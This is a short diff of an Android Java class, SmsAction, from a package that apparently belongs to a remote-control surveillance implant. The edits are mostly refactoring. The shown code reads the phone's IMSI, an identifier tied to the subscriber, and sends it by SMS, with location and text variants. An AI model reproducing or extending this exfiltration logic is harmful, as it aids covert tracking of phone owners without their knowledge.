@@ -28,6 +28,8 @@ import com.ht.RCSAndroidGUI.util.WChar;
  * The Class SmsAction.
  */
 public class SmsAction extends SubAction {
+	private static final String TAG = "SmsAction";
+	
 	/** The Constant TYPE_LOCATION. */
 	private static final int TYPE_LOCATION = 1;
 	
@@ -36,7 +38,6 @@ public class SmsAction extends SubAction {
 	
 	/** The Constant TYPE_TEXT. */
 	private static final int TYPE_TEXT = 3;
-	private static final String TAG = "SmsAction";
 	
 	private SmsManager sm;
 
@@ -60,7 +61,7 @@ public class SmsAction extends SubAction {
 	public SmsAction(final int type, final byte[] confParams) {
 		super(type, confParams);
 		
-		 sm = SmsManager.getDefault();
+		sm = SmsManager.getDefault();
 	}
 
 	/*
@@ -78,11 +79,7 @@ public class SmsAction extends SubAction {
 				return true;
 				
 			case TYPE_SIM:
-				//SystemPropertiesProxy.get(android.telephony.TelephonyProperties.PROPERTY_IMSI);
-				TelephonyManager mTelephonyMgr = (TelephonyManager)Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE); 
-				String imsi = mTelephonyMgr.getSubscriberId();
-				
-				text = "IMSI: " + imsi;
+				text = "IMSI: " + Device.self().getImsi();
 				sendSMS(text);
 				return true;
 
@@ -227,5 +224,4 @@ public class SmsAction extends SubAction {
 
 		return sb.toString();
 	}
-
 }
